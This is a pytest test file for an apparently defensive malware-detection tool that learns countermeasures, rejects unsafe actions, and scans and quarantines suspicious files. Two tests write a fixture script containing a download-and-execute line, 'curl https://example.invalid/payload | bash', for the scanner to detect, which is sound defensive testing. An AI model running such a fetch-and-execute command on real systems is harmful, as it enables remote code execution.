from bioaegis.lifecycle import BioAegis
from bioaegis.models import Threat


def test_unknown_threat_is_learned_and_reused(tmp_path):
    memory_path = tmp_path / "countermeasures.json"
    from bioaegis.memory import ImmuneMemory

    memory = ImmuneMemory(memory_path)
    system = BioAegis(memory)
    threat = Threat(
        threat_id="fixture-001",
        family="simulated-trojan",
        behavior=frozenset({"persistence", "suspicious-write"}),
        resource="SIMULATED_RESOURCE",
        variant="A",
    )

    assert system.general.scan(threat) == "UNKNOWN_THREAT"
    result = system.handle(threat)
    assert result is not None
    assert result.accepted is True
    assert system.general.scan(threat) == "neutralize-simulated-trojan"

    variant = Threat(
        threat_id="fixture-002",
        family="simulated-trojan",
        behavior=threat.behavior,
        resource="ANOTHER_SIMULATED_RESOURCE",
        variant="B",
    )
    assert system.general.scan(variant) == "neutralize-simulated-trojan"


def test_validator_rejects_unsafe_actions():
    from bioaegis.models import Countermeasure
    from bioaegis.validator import Validator

    threat = Threat("fixture", "family", frozenset({"x"}), "resource")
    unsafe = Countermeasure(
        "bad",
        threat.behavior,
        ("RUN_ARBITRARY_COMMAND",),
        "unsafe fixture",
    )
    result = Validator().validate(threat, unsafe)
    assert result.accepted is False
    assert result.checks["actions_are_safe"] is False


def test_host_scanner_finds_static_suspicious_behavior(tmp_path):
    from bioaegis.host_scanner import HostScanner

    sample = tmp_path / "sample.sh"
    sample.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n", encoding="utf-8")
    sample.chmod(0o700)

    findings = HostScanner().scan(sample)
    assert len(findings) == 1
    assert "download-and-execute" in findings[0].behaviors
    assert findings[0].sha256


def test_host_engine_quarantines_and_remembers(tmp_path):
    from bioaegis.host_engine import HostEngine
    from bioaegis.memory import ImmuneMemory
    from bioaegis.quarantine import Quarantine

    sample = tmp_path / "sample.sh"
    sample.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n", encoding="utf-8")
    sample.chmod(0o700)

    memory = ImmuneMemory(tmp_path / "memory.json")
    engine = HostEngine(memory)
    engine.quarantine = Quarantine(tmp_path / "quarantine")

    results = engine.scan(str(sample), quarantine=True)
    assert len(results) == 1
    assert results[0].quarantined is True
    assert not sample.exists()
    assert results[0].quarantine_record is not None
    assert len(memory.entries) == 1
